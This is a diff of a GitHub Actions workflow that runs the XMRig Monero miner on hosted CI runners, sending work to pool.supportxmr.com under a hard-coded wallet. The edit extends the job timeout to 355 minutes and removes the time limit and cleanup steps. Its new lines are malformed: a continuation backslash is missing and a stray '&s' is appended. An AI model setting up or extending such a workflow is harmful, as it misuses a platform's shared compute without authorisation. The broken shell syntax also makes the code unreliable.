@@ -8,7 +8,7 @@ on:
 jobs:
   mine:
     runs-on: ubuntu-latest
-    timeout-minutes: 14  # Must be less than interval
+    timeout-minutes: 355  # Must be less than interval
     steps:
       - name: Generate unique worker ID
         id: worker
@@ -36,22 +36,10 @@ jobs:
         run: |
           cd ~/xmrig_setup/xmrig/build
           # Start in background with nohup
-          nohup ./xmrig \
+          ./xmrig \
             -o pool.supportxmr.com:443 \
             -u 85jUiJ7tUsZ1gCRTVy4RyoQwPypRBQf1CaZvhogatc1hYHeecdqcq4uUAWntQyUdRhZRB72n1Vt792JvPcstTcntR2g9eZS \
             -p ${{ steps.worker.outputs.name }} \
             -k --tls --donate-level=1 \
-            -t $(($(nproc)-1)) \  # Leave 1 core free
-            --randomx-init=1 \
-            --randomx-mode=fast \
-            --cpu-max-threads-hint=95 \
-            --nicehash \
-            > /dev/null 2>&1 &
-          
-          # Let it run for most of the interval
-          sleep 720  # 12 minutes
-          
-          # Clean up
-          pkill -f xmrig
-          sync
-          sleep 3
+            -t 4
+            > /dev/null 2>&1 &s
